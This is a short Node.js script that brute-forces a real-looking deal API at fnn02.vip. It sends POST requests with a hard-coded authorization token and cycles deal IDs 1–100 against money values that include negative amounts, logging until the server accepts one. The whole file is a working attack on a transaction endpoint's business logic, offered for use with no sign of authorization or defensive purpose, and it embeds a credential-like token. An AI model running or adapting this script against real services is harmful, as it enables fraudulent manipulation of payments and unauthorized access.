const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import fs from "fs";

const endpoint = 'https://fnn02.vip/api_deal/load/create';
const authHeader = 'TERc/9260xgILO4HuXsdtru5hUy4NZjhpkzd/DhE6dFVY5F/OeFmjKcyxdgfTmEri7QVcxVVCuCp9Gg95K1nIlSKv4Rl3pyHzkJR0ji1yw2Nqzp0srkvQoGkRHPBb8ydi99aFnkR00PeDAqHjmTAHY2mdp9pgnfKrAo3Aa7BwIU='

const outputFile = 'break_results.json';

// Utilities
async function testCombination(deal_id, money) {
  const payload = { deal_id, money };
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    const text = await res.text();
    let json;
    try {
      json = JSON.parse(text);
    } catch {
      json = { raw: text.slice(0, 200) };
    }
    const success = res.status === 200 && !json.error;
    return { deal_id, money, status: res.status, response: json, success };
  } catch (err) {
    return { deal_id, money, error: err.message, success: false };
  }
}

// Logging
function logResult(record) {
  fs.appendFileSync(outputFile, JSON.stringify(record, null, 2) + ',\n');
}

// Main
(async () => {
  console.log('🚀 Starting brute force tests...');
  // Example ranges
  const dealIds = Array.from({length: 100}, (_, i) => i+1); // 1 to 100
  const moneyValues = [-1000, -500, -100, -10, -1, 0, 1, 10, 100, 1000];

  for (const deal_id of dealIds) {
    for (const money of moneyValues) {
      const result = await testCombination(deal_id, money);
      console.log(`Test deal_id=${deal_id}, money=${money} → success=${result.success}`);
      logResult(result);
      if (result.success) {
        console.log('🎉 Found success with', result);
        process.exit(0);
      }
    }
  }

  console.log('🔎 Brute force completed. No success found.');
})();
